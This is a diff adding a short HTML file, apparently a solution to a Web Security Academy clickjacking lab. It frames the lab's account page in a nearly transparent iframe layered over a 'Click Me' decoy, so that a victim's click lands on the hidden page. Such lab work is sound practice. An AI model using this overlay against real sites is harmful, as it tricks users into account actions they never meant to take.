@@ -1,0 +1,23 @@
+<style>
+iframe{
+position:relative;
+width: 100%;
+height: 100%;
+opacity: 0.1;
+z-index:2;
+}
+div{
+position:absolute;
+top: 500px;
+left: 75px;
+z-index:1;
+}
+
+</style>
+
+
+<iframe src="https://0a540099036efb40c067a9e30001008b.web-security-academy.net/my-account">
+</iframe>
+<div>
+Click Me
+</div>
